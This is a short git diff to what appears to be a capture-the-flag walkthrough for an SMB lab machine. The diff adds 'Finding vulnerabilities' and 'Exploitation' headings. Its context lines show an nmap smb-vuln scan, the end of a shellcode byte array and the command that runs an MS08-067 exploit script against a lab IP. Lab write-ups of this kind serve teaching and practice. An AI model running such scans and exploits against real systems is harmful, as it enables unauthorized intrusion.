@@ -64,7 +64,7 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu May 18 22:26:02 2023 -- 1 IP address (1 host up) scanned in 33.82 seconds
 ```
-
+## Finding vulnerabilities
 Scanning for vulnerabilities:
 ```
 # Nmap 7.93 scan initiated Thu May 18 22:27:02 2023 as: nmap -Pn -n -sV -p 135,139,445 --script smb-vuln* -oN smb_vuln 10.10.10.4
@@ -157,7 +157,7 @@ shellcode=(
     "\xdb\xe8\xd7\xb1\xfa\x78\x68"
 )
 ```
-
+## Exploitation
 Run the exploit.
 ```
 python2.7 ms08_067_2018_2.7.py 10.10.10.4 6 445 
